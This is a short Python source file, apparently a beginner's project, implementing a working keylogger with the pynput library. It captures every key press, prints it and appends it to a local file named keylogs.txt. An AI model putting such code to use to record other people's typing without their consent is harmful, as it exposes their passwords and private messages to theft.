from pynput import keyboard  

class KeyLogger():
    def __init__(self, filename: str = "keylogs.txt") -> None:   # Creates a text file named keylogs.txt
        self.filename = filename

    @staticmethod
    def get_char(key):                            
        try:                      #
            return key.char       # checks if a keystroke typed is a character and prints them
        except AttributeError:    # 
            return str(key)       # if it's was not a valid character, it prints as a string(a sequencec of characters)

    def on_press(self, key):
        print(self.get_char(key))                # Prints the keystroke you typed
        with open(self.filename, 'a') as logs:  # 
            logs.write(self.get_char(key))     # Writes the keystrokes on the file we created earlier

    def main(self):
        listener = keyboard.Listener(
            on_press=self.on_press,           # Listens and try to catch the keystrokes as you type
        )
        listener.start()


if __name__ == '__main__':
    logger = KeyLogger()                 # Starts the whole process
    logger.main()
    input()
